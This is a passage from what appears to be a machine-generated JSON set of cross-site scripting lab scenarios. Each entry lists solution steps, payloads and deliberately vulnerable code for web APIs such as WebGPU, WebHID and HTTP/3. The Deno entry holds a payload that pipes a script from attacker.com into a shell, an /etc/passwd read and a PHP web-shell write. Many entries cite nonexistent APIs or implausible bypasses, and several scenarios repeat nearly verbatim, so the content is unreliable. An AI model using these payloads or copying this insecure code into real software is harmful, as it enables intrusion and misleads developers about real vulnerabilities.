      "Verify in Chromium-based browsers"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<iframe src=\"https://attacker.com\" allow=\"trusted-types *\"></iframe>",
      "trustedTypes.createPolicy('default', {createHTML: s=>s})"
    ],
    "srcCode": "app.use((req, res) => {\n  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');\n  res.setHeader('Cross-Origin-Embedder-Policy', 'unsafe-none'); // Dangerous\n});"
  },
  {
    "Lab scenario": "WebGPU Shader Injection in 3D Design Viewer",
    "Lab Description": "CAD visualization tool processes WGSL shaders from untrusted sources with debug logging. The application converts shader compilation errors to HTML without sanitization. To solve: Inject JavaScript through crafted shader error messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger shader compilation errors with malformed directives",
      "Craft payload: //! <img src=x onerror=alert(1)>",
      "Bypass error sanitization using line continuation escapes",
      "Chain with push constant buffer overflows",
      "Verify via Chrome WebGPU Inspector"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@vertex fn main() -> [[location(0)]] vec4<f32> { return vec4<f32>(); } // </style><script>alert(1)</script>",
      "[[stage(vertex)]] fn main() -> [[location(0)]] vec4<f32> { /* <svg/onload=alert(1)> */ }"
    ],
    "srcCode": "device.createShaderModule({ code: userShader }).catch((e) => {\n  document.getElementById('errors').innerHTML = e.message; // Vulnerable\n});"
  },
  {
    "Lab scenario": "HTTP/3 Early Data XSS in E-Commerce Cache",
    "Lab Description": "Online store implements HTTP/3 with 0-RTT early data support. The application caches responses containing unvalidated early data parameters. To solve: Poison CDN cache through TLS 1.3 early data injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft early data request using curl --http3 --early-data",
      "Inject payload: GET /?q=<script>alert(1)</script> HTTP/3",
      "Bypass request replay protection via session ticket rotation",
      "Automate with h2o HTTP/3 client",
      "Verify through Cloudflare cache status"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Early-Data: 1\n\nGET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/3",
      "Alt-Svc: h3=\":443\"; ma=86400"
    ],
    "srcCode": "app.use((req, res) => {\n  if (req.earlyData) {\n    res.send(`Search results for: ${req.query.q}`); // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "Deno Runtime Sandbox Escape via WebSocket Proxy",
    "Lab Description": "Serverless platform exposes Deno WebSocket proxy with --allow-net permissions. The application uses Deno.writeTextFile() with unsanitized input. To solve: Achieve RCE through XSS-to-filesystem bridge.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket upgrade request with OWASP ZAP",
      "Craft payload: Deno.writeTextFile('/var/www/html/backdoor', '<?=`$_GET[0]`?>')",
      "Bypass permission prompts using WebSocket origin validation flaws",
      "Chain with file:// protocol handling",
      "Verify through writeFileSync success callback"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script>Deno.run({cmd:['bash','-c','curl attacker.com/shell.sh|sh']})</script>",
      "fetch('file:///etc/passwd').then(r=>r.text())"
    ],
    "srcCode": "Deno.serve((req) => {\n  const ws = new WebSocket(req);\n  ws.onmessage = (e) => {\n    eval(e.data); // Vulnerable\n  };\n});"
  },
  {
    "Lab scenario": "WebCodecs Video Frame XSS in Live Streaming Platform",
    "Lab Description": "Video streaming service processes raw YUV frames using WebCodecs API with vulnerable debug overlays. The application injects user-controlled metadata into <canvas> elements via innerHTML. To solve: Achieve XSS through crafted video timestamp payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture video stream using MediaRecorder API",
      "Inject payload: <!--</canvas><svg/onload=alert(1)>-->",
      "Bypass frame validation using color space conversion quirks",
      "Chain with OffscreenCanvas rendering pipeline",
      "Verify through WebGL texture analysis"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "videoFrame.copyTo(new Uint8Array([60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]))",
      "timestamp: 0x3Cscript%3Ealert(1)%3C/script%3E"
    ],
    "srcCode": "const encoder = new VideoEncoder({\n  output: (frame) => {\n    document.getElementById('overlay').innerHTML += \n      `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "Private Network Access XSS in Internal Monitoring Tool",
    "Lab Description": "Corporate network dashboard uses insecure Private Network Access headers with postMessage handlers. The application trusts origin validation for internal IP ranges. To solve: Bypass PNA restrictions through DNS rebinding and inject XSS via cross-origin messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up DNS rebinding attack with 127.0.0.1 resolution",
      "Craft payload: window.opener.postMessage('<img/src=x onerror=alert(1)>','*')",
      "Bypass IP validation using IPv4-mapped IPv6 addresses",
      "Automate with TTL manipulation in BIND",
      "Verify through internal network traversal"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "location.href = 'http://[::ffff:127.0.0.1]/dashboard'",
      "<iframe src=\"http://attacker.com\" onload=\"contentWindow.postMessage('<script>alert(1)</script>','*')\"></iframe>"
    ],
    "srcCode": "window.addEventListener('message', (e) => {\n  if(e.origin.startsWith('http://10.')) {\n    document.body.innerHTML = e.data; // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "Import Attributes Injection in Micro-Frontend Orchestrator",
    "Lab Description": "Cloud-native platform dynamically constructs module imports using user-controlled attributes. The application passes import assertions without validation. To solve: Hijack module loading via crafted integrity hashes and type assertions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept module fetch with Service Worker",
      "Craft payload: import('./malicious.js', {assert: {type: 'text/html'}})",
      "Bypass SRI using hash collision attacks",
      "Chain with modulepreload speculation rules",
      "Verify through dependency graph visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "import('data:text/javascript,alert(1)', {assert:{type:'css'}})",
      "<script type=\"module\" integrity=\"sha256-...\">import</script>"
    ],
    "srcCode": "const module = await import(userPath, {\n  assert: JSON.parse(userAssertions) // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebHID Device Spoofing XSS in Medical IoT Portal",
    "Lab Description": "Patient monitoring system connects to WebHID devices without proper origin validation. The application renders device names in dashboards using innerText with vulnerable CSS escapes. To solve: Inject XSS through spoofed HID device metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Spoof HID device using Teensy microcontroller",
      "Craft payload: \"deviceName\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
      "Bypass USB descriptor validation using report ID manipulation",
      "Automate with WebHID polyfill injections",
      "Verify through patient vitals display"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"vendorId\":0x1337,\"productId\":0x0001,\"deviceName\":\"<svg/onload=alert(1)>\"}",
      "hidDevice.sendReport(new Uint8Array([60,115,99,114,105,112,116,62]))"
    ],
    "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('device').innerText = \n    devices[0].productName; // Vulnerable CSS unescape\n});"
  },
  {
    "Lab scenario": "ARIA Role XSS in Accessibility Interface",
    "Lab Description": "Screen reader compatibility layer misinterprets ARIA role attributes as executable code. The application uses role values in click handlers without validation. To solve: Achieve XSS through crafted role=alertdialog payloads.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify ARIA role injection via Lighthouse audit",
      "Craft payload: <div role=\"alertdialog\" aria-label=\"</div><script>alert(1)</script>\">",
      "Bypass sanitizer using ARIA 1.2 role taxonomy",
      "Chain with accessible name calculation quirks",
      "Verify through NVDA screen reader output"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<span role=\"button\" aria-keyshortcuts=\"Shift+Alt+X\" onkeydown=\"alert(1)\">",
      "<div role=\"math\" aria-label=\"\\3C script\\3E alert(1)\\3C /script\\3E\"></div>"
    ],
    "srcCode": "document.querySelectorAll('[role]').forEach(el => {\n  el.addEventListener('click', () => {\n    eval(el.getAttribute('role')); // Vulnerable\n  });\n});"
  },
  {
    "Lab scenario": "WebAssembly Component Model XSS in Decentralized Exchange",
    "Lab Description": "Blockchain DEX processes WASM components with unsafe interface type reflection. The application renders component exports using innerHTML for debug purposes. To solve: Achieve XSS through maligned string encoding in component model adapters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile malicious component using jco toolchain",
      "Craft payload: (component (export \"\\3C script\\3E alert(1)\" (func)))",
      "Bypass UTF-8 validation using WTF-8 encoding",
      "Chain with multi-memory proposals",
      "Verify via WASI preview2 runtime"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "data:application/wasm-component;base64,CmNvbXBvbmVudAo...",
      "(instance (export \"<svg/onload=alert(1)>\" (func 0)))"
    ],
    "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndocument.getElementById('exports').innerHTML = \n  JSON.stringify(component.exports); // Vulnerable"
  },
  {
    "Lab scenario": "HTTP/2 Rapid Reset Cache Poisoning XSS in CDN Edge Nodes",
    "Lab Description": "Global CDN caches H/2 streams with vulnerable rapid reset request handling. The application reflects query parameters in stale cached responses. To solve: Poison edge cache via request cancellation attacks with XSS payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft H/2 stream with RST_STREAM frames using h2spec",
      "Inject payload: GET /?q=<script>alert(1)</script> HTTP/2",
      "Bypass HPACK compression with Huffman coding bypass",
      "Automate with nghttp2 flood tool",
      "Verify via Cloudflare cache-status headers"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ":method: GET\n:path: /?q=%3Cscript%3Ealert(1)%3C/script%3E\n\n",
      "accept-encoding: gzip, deflate, br\ncache-control: no-cache\n"
    ],
    "srcCode": "app.get('/', (req, res) => {\n  res.set('Cache-Control', 'public, max-age=300');\n  res.send(`Search: ${req.query.q}`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebNN Model Poisoning XSS in AI Art Generator",
    "Lab Description": "Generative AI platform loads ONNX models with unsafe tensor metadata handling. The application reflects model labels in <meta> tags without sanitization. To Solve: Inject HTML through crafted model output names.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify ONNX model using onnx-modifier",
      "Craft payload: output_name: \"</title><svg/onload=alert(1)>\"",
      "Bypass model signature validation using quantization",
      "Chain with WebGPU buffer binding",
      "Verify through art gallery rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"outputs\":[{\"name\":\"\\3C script\\3E alert(1) \"}]}",
      "tensor_name: Uint8Array.from([60,115,99,114,105,112,116,62])"
    ],
    "srcCode": "const model = await navigator.ml.createContext().loadModel(userModel);\ndocument.head.innerHTML += \n  `<meta name=\"model-output\" content=\"${model.outputs[0].name}\">`; // Vulnerable"
  },
  {
    "Lab scenario": "Storage Access API XSS in Multi-Site Embedded Widget",
    "Lab Description": "Universal login widget uses storageAccess() with permissive cross-site cookie access. The application renders OAuth states in hidden fields via dangerouslySetInnerHTML. To Solve: Bypass same-site restrictions via nested iframe storage grants.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create triple-nested iframe structure",
      "Craft payload: document.hasStorageAccess().then(() => { /* XSS */ })",
      "Bypass user gesture requirements using requestStorageAccessFor()",
      "Chain with postMessage state synchronization",
      "Verify through cross-domain cookie access"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<iframe src=\"attacker.com\" allow=\"storage-access 'self'\"></iframe>",
      "document.requestStorageAccessFor('https://victim.com')"
    ],
    "srcCode": "document.hasStorageAccess().then((hasAccess) => {\n  document.getElementById('state').innerHTML = \n    `<input type=\"hidden\" value=\"${hasAccess}\">`; // Vulnerable\n});"
  },
  {
    "Lab scenario": "SVG Font Injection XSS in Design Platform Icon Editor",
    "Lab Description": "Vector graphics editor processes SVG fonts with unsafe @font-face rules. The application uses DOMPurify 3.1.0 with whitelisted font loading. To Solve: Achieve XSS through font glyph path command injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create malicious SVG font using FontForge",
      "Craft payload: <glyph unicode='&#x3C;' d='M0 0' onload='alert(1)'/>",
      "Bypass MIME type validation using data: URLs",
      "Chain with CSS @font-face selector",
      "Verify through icon preview rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg><font><font-face><glyph unicode=\"<\" d=\"M0 0\" onload=\"alert(1)\"/></font></svg>",
      "@font-face { font-family:x; src:url('data:image/svg+xml,<svg/>...'); }"
    ],
    "srcCode": "app.post('/font', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.svg, {\n    ALLOWED_TAGS: ['font', 'glyph'] // Dangerous\n  });\n  res.send(sanitized);\n});"
  },
  {
    "Lab scenario": "DOM XSS in AI-Powered Chat History Export",
    "Lab Description": "LLM chatbot platform exports conversation history as HTML files using unsafe document.implementation.createHTMLDocument(). The application inserts user-controlled message IDs into CSS selectors. To solve: Execute alert() through CSS injection in exported files.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Export chat history via API using Postman",
      "Craft payload: message-id{background-image:url('javascript:alert(1)')}",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with SVG font-face rules",
      "Verify through Chromium PDF rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<style>#\\33A7F9 { content: \"</style><script>alert(1)</script>\" }</style>",
      "<link rel=stylesheet href='data:,*%7Bcolor:red%7D'/>"
    ],
    "srcCode": "const doc = document.implementation.createHTMLDocument();\ndoc.body.innerHTML = `<div id='${userID}'>${messages}</div>`; // Vulnerable"
  },
  {
    "Lab scenario": "Stored XSS in VR Meeting Room Descriptions",
    "Lab Description": "Metaverse platform stores WebGL room descriptions in IndexedDB without output encoding. The application renders 3D text using Three.js TextGeometry with raw HTML. To solve: Inject WebGL shader code that triggers JS execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket room update messages",
      "Craft payload: <mesh onclick=alert(1)>",
      "Bypass Three.js sanitization using BufferGeometry",
      "Automate with A-Frame VR toolkit",
      "Verify through Oculus browser"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new THREE.TextGeometry('\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E')",
      "material.onBeforeCompile = (shader) => { alert(1) }"
    ],
    "srcCode": "const loader = new THREE.ObjectLoader();\nloader.parse(userData, (obj) => {\n  scene.add(obj); // Vulnerable 3D object\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Biometric Auth Error Pages",
    "Lab Description": "Fingerprint login system displays authentication errors using innerText with vulnerable CSS escape handling. The application implements broken Unicode normalization for error codes. To solve: Abuse CSS counter styles to reconstruct script tags.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger auth failures with modified fingerprint data",
      "Craft payload: Error 0xFE0F: \\FE0F\\003Cscript\\003E",
      "Bypass textContent sanitization using CSS.supports()",
      "Chain with ::marker pseudo-element injection",
      "Verify in Safari's text renderer"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "counter-reset: x 0x3C; content: counter(x, upper-hexadecimal)",
      "@counter-style x { system: cyclic; symbols: \"\\3C script\\3E\" }"
    ],
    "srcCode": "app.get('/auth-error', (req, res) => {\n  res.send(`<div class='error'>Code: ${req.query.code}</div>`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "Blind XSS in Drone Telemetry Dashboard",
    "Lab Description": "UAV control system stores flight logs in Elasticsearch without input sanitization. The application uses Kibana Timelion expressions to visualize data. To solve: Achieve XSS through malicious Timelion sheet formulas.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject payload via MAVLink telemetry stream",
      "Craft formula: .es('</script><svg/onload=alert(1)>')",
      "Bypass Lucene query parsing using URL encoding",
      "Automate with DroneKit Python API",
      "Monitor Kibana Discover tab"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ".label(\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\")",
      ".title('<img/src=x onerror=alert(document.domain)>')"
    ],
    "srcCode": "app.post('/telemetry', (req, res) => {\n  esClient.index({\n    index: 'drones',\n    body: req.body // Raw input\n  });\n});"
  },
  {
    "Lab scenario": "Reflected XSS in Web3 DAO Proposal Renderer",
    "Lab Description": "Blockchain governance platform renders proposal markdown using insecure remark-html configuration. The application allows raw HTML in CommonMark with broken sanitization. To solve: Execute alert() through malicious proposal titles.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit proposal via Ethers.js contract interaction",
      "Craft payload: [x](javascript://%0aalert(1))",
      "Bypass markdown renderer using soft line breaks",
      "Automate with Hardhat test suite",
      "Verify through Snapshot.org-style UI"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "```html\n<script>alert(1)</script>\n```",
      "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=)"
    ],
    "srcCode": "const html = unified()\n  .use(remarkParse)\n  .use(remarkHtml, {sanitize: false}) // Vulnerable\n  .processSync(markdown);"
  },
  {
    "Lab scenario": "WebGPU Compute Shader XSS in Cryptocurrency Mining Dashboard",
    "Lab Description": "Mining pool interface processes compute shaders with unsafe buffer sharing between JS/WebGPU. The application maps storage buffers to DOM elements via innerHTML. To solve: Corrupt GPU buffers to inject HTML payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Reverse-engineer shader using WGSL analyzer",
      "Craft payload: [[stage(compute), workgroup_size(64)]] fn main() { /* <script> */ }",
      "Bypass buffer validation using out-of-bounds writes",
      "Chain with timestamp queries for timing attacks",
      "Verify via Chrome WebGPU Inspector"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "device.createBuffer({mappedAtCreation: true, size: 64, usage: GPUBufferUsage.STORAGE }).getMappedRange().set(new TextEncoder().encode('</canvas><svg onload=alert(1)>'))",
      "[[block]] struct XSS { data: array<u32>; };"
    ],
    "srcCode": "const buffer = device.createBuffer({ /* user-controlled */ });\ndocument.getElementById('stats').innerHTML = \n  new TextDecoder().decode(buffer.getMappedRange());"
  },
  {
    "Lab scenario": "WebHID Medical Sensor XSS in Telehealth Platform",
    "Lab Description": "Patient monitoring system connects to WebHID glucose monitors without input validation. The application renders device names in <select> elements via dangerouslySetInnerHTML. To solve: Spoof medical device metadata to inject XSS payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Spoof HID device using Raspberry Pi Pico",
      "Craft payload: \"productName\": \"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"",
      "Bypass USB descriptor validation using phantom interfaces",
      "Automate with WebHID polyfill",
      "Verify through patient chart rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"vendorId\":0xDEAD,\"productId\":0xBEEF,\"productName\":\"<iframe/src=javascript:alert(1)>\"}",
      "reportDescriptor: new Uint8Array([0x06, 0x00, 0xFF, ...])"
    ],
    "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('device-list').innerHTML = \n    devices.map(d => `<option>${d.productName}</option>`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "HTTP/3 DATAGRAM XSS in Real-Time Sports Betting",
    "Lab Description": "Odds streaming service uses QUIC DATAGRAM frames with unsafe buffer concatenation. The application processes early data with vulnerable TextDecoder streams. To solve: Inject XSS through fragmented QUIC payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft DATAGRAM frames using quiche library",
      "Inject payload: 0x3C 0x73 0x63 0x72 0x69 0x70 0x74 0x3E",
      "Bypass flow control using connection migration",
      "Automate with Cloudflare quiche examples",
      "Verify through betting slip rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new QuicDatagram(new Uint8Array([60,115,99,114,105,112,116,62]))",
      "quic_send(fd, buffer, 0x3C7363726970743E)"
    ],
    "srcCode": "quiche_conn_recv_dgram(conn, buf, buf_len, &info);\nprintf(\"Received: %s\", buf); // Vulnerable logging"
  },
  {
    "Lab scenario": "CSS Anchor Positioning XSS in Legal Document Editor",
    "Lab Description": "Contract drafting tool implements CSS anchor positioning with unsafe grid-template-area names. The application reflects user input in CSSOM using insertRule(). To solve: Abuse grid area identifiers to break style context.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify grid injection via DevTools Styles panel",
      "Craft payload: grid-template-areas: \"</style><script>alert(1)</script>\"",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @layer ordering attacks",
      "Verify through PDF export rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "grid-template-areas: \"\\3C script\\3E alert(1) \\3C /script\\3E\"",
      "@container style(--x: </style><svg/onload=alert(1)>)"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { --areas: \"${userInput}\" }`); // Vulnerable\n document.adoptedStyleSheets = [sheet];"
  },
  {
    "Lab scenario": "WebTransport Bidirectional Stream XSS in AR Navigation",
    "Lab Description": "Augmented reality navigation system uses WebTransport streams for location updates. The application processes geospatial data with unsafe DOMParser(). To solve: Inject HTML through malformed GeoJSON payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport session via DevTools Protocol",
      "Craft payload: {\"type\":\"Feature\",\"properties\":{\"</script><svg onload=alert(1)>\":1}}",
      "Bypass QUIC stream limits using connection migration",
      "Automate with webtransport-py",
      "Verify through 3D map overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new TextEncoder().encode('</script><svg/onload=alert(document.domain)>')",
      "data:application/geo+json,{\"coordinates\":[0,0],\"html\":\"<script>alert(1)</script>\"}"
    ],
    "srcCode": "const decoder = new TextDecoder();\nfor await (const chunk of reader) {\n  document.getElementById('map').innerHTML += \n    decoder.decode(chunk); // Vulnerable\n}"
  },
  {
    "Lab scenario": "WebCodecs Video Frame Injection in Live Streaming Moderation",
    "Lab Description": "Content moderation tool analyzes video streams using WebCodecs API with unsafe debug overlay rendering. The application injects user-controlled metadata into <canvas> via innerHTML. To solve: Achieve XSS through crafted video timestamp payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept H.264 stream using FFmpeg",
      "Inject payload: <!--</canvas><svg/onload=alert(1)>--> in SEI messages",
      "Bypass frame validation using color space conversion quirks",
      "Chain with WebGL texture sampling",
      "Verify through moderation UI overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "videoFrame.copyTo(new Uint8Array([...'<script>alert(1)</script>']))",
      "timestamp: 0x3C7363726970743E"
    ],
    "srcCode": "const encoder = new VideoEncoder({\n  output: (frame) => {\n    document.getElementById('overlay').innerHTML += \n      `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "Private Network Access Bypass in Internal HR System",
    "Lab Description": "Employee portal uses relaxed PNA headers with postMessage handlers trusting internal IPs. The application renders error messages via dangerouslySetInnerHTML. To solve: Bypass IP validation via DNS rebinding and inject XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure DNS rebinding to 127.0.0.1",
      "Craft payload: window.opener.postMessage('<img/src=x onerror=alert(1)>','*')",
      "Bypass CORS using 103 Early Hints responses",
      "Automate with dnsmasq config",
      "Verify through internal VPN access"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<iframe src=\"http://[::ffff:127.0.0.1]\" allow=\"storage-access 'self'\"></iframe>",
      "fetch('http://10.0.0.1', {mode: 'no-cors'})"
    ],
    "srcCode": "window.addEventListener('message', (e) => {\n  if(e.origin.startsWith('http://192.168')) {\n    document.body.innerHTML = e.data; // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "Import Maps Sandbox Escape in Micro-Frontend Host",
    "Lab Description": "Cloud platform dynamically constructs import maps from URL parameters with lax Content-Security-Policy. The application uses JSON.parse() on user input without validation. To solve: Hijack module loading via crafted integrity hashes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept import map request via MitM proxy",
      "Inject payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
      "Bypass SRI using hash length extension attacks",
      "Chain with modulepreload hints",
      "Verify through dependency tree visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "import('data:text/javascript,alert(document.domain)')",
      "<script type=\"importmap\">{\"imports\":{\"@core/\":\"javascript:alert(1)\"}}</script>"
    ],
    "srcCode": "app.get('/config', (req, res) => {\n  res.json(JSON.parse(req.query.imports)); // Vulnerable\n});"
  },
  {
    "Lab scenario": "ARIA Live Region XSS in Social Media Notifications",
    "Lab Description": "Accessibility-focused platform uses aria-live regions with dangerous dynamic content updates. The application renders notifications via innerHTML without sanitizing screen reader text. To solve: Abuse live region politeness levels to trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger notification via API spam",
      "Craft payload: <div aria-live=\"assertive\"><script>alert(1)</script></div>",
      "Bypass sanitizer using ARIA role=alertdialog",
      "Chain with Speech Synthesis API",
      "Verify through NVDA screen reader"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<span role=\"alert\">\u202e}\u202ealert(1)//</span>",
      "<div aria-hidden=\"true\"><template shadowroot=open><script>alert(1)</script>"
    ],
    "srcCode": "function showNotification(text) {\n  liveRegion.innerHTML = text; // Vulnerable\n}"
  },
  {
    "Lab scenario": "WebNN Model Poisoning XSS in AI-Powered Recruiting",
    "Lab Description": "Job matching service loads ONNX models with unsafe tensor metadata handling. The application reflects model labels in <meta> tags without encoding. To solve: Inject HTML through crafted model output names.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify ONNX model using Netron",
      "Craft payload: output_name: \"</title><svg/onload=alert(1)>\"",
      "Bypass model signature validation via quantization",
      "Chain with WebGPU buffer binding",
      "Verify through candidate profile rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"outputs\":[{\"name\":\"\\u003Cscript\\u003Ealert(1)\"}]}",
      "tensor_name: Uint8Array.from([60,115,99,114,105,112,116,62])"
    ],
    "srcCode": "const model = await navigator.ml.createContext().loadModel(userUpload);\ndocument.head.innerHTML += \n  `<meta name=\"model-output\" content=\"${model.outputs[0].name}\">`;"
  },
  {
    "Lab scenario": "WebAssembly Threads XSS in Multiplayer Game Lobby",
    "Lab Description": "Browser-based game uses WebAssembly threads for real-time sync with unsafe SharedArrayBuffer exposure. The application renders player names via innerHTML using memory-mapped Atomics. To solve: Corrupt shared memory to inject HTML payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze shared memory with Chrome DevTools Memory Inspector",
      "Craft payload: Atomics.store(memory, 0, 0x3C7363726970743E)",
      "Bypass bounds checking via growable memory",
      "Chain with worker.postMessage() timing attacks",
      "Verify through leaderboard rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new SharedArrayBuffer(1024).set([...'<script>alert(1)</script>'])",
      "WebAssembly.instantiate(maliciousModule, {env:{memory: new Memory({initial:1})}})"
    ],
    "srcCode": "const memory = new WebAssembly.Memory({ shared: true, initial: 1 });\ndocument.getElementById('players').innerHTML = \n  new TextDecoder().decode(memory.buffer); // Vulnerable"
  },
  {
    "Lab scenario": "HTTP/2 Trailers XSS in Ad Tech Bid Stream",
    "Lab Description": "Real-time bidding platform processes HTTP/2 trailers with vulnerable trailer header reflection. The application logs bid responses using console.html() without encoding. To solve: Inject XSS via malformed Trailer: XSS-Header fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft H/2 request with trailers using nghttp2",
      "Inject payload: Trailer: XSS-Header: <script>alert(1)</script>",
      "Bypass HPACK compression via header table size manipulation",
      "Automate with Python hyper-h2 library",
      "Verify through ad campaign dashboard"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "trailers: {'x-trailer': 'javascript:alert(1)'}",
      "END_STREAM flag with trailing headers containing XSS"
    ],
    "srcCode": "app.use((req, res) => {\n  req.on('trailers', (trailers) => {\n    console.log(`Trailers: ${trailers}`); // Vulnerable\n  });\n});"
  },
  {
    "Lab scenario": "CSS View Transitions XSS in E-Commerce Product Carousel",
    "Lab Description": "Product carousel implements view transitions API with unsafe pseudo-element content handling. The application reflects product IDs in ::view-transition-old() selectors. To solve: Abuse named transitions to inject style-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify transition targets via Chrome Rendering panel",
      "Craft payload: ::view-transition-old(xss) { content: \"</style><svg/onload=alert(1)>\" }",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @starting-style rules",
      "Verify through cross-document transitions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@view-transition { navigation: auto; }\n::view-transition-group(*) { content: \"\\3C script\\3E alert(1) \" }",
      "document.startViewTransition(() => { location.href = 'data:text/html,<script>alert(1)</script>' })"
    ],
    "srcCode": "document.startViewTransition(() => {\n  document.getElementById('carousel').innerHTML = \n    `<div style=\"view-transition-name: ${productID}\"></div>`; // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebSerial API Spoofing XSS in Industrial Control Panel",
    "Lab Description": "SCADA system connects to WebSerial devices with unsafe port.claim() validation. The application renders device metadata via innerText with vulnerable CSS escapes. To solve: Spoof USB-CDC device with malicious metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof serial device using Arduino Leonardo",
      "Craft payload: \"productId\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
      "Bypass serial buffer validation using flowControl: 'hardware'",
      "Automate with WebSerial polyfill",
      "Verify through HMI interface"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"usbVendorId\":0x1234,\"usbProductId\":0x5678,\"productName\":\"<iframe/src=javascript:alert(1)>\"}",
      "serialPort.write(new TextEncoder().encode('</script><svg/onload=alert(1)>'))"
    ],
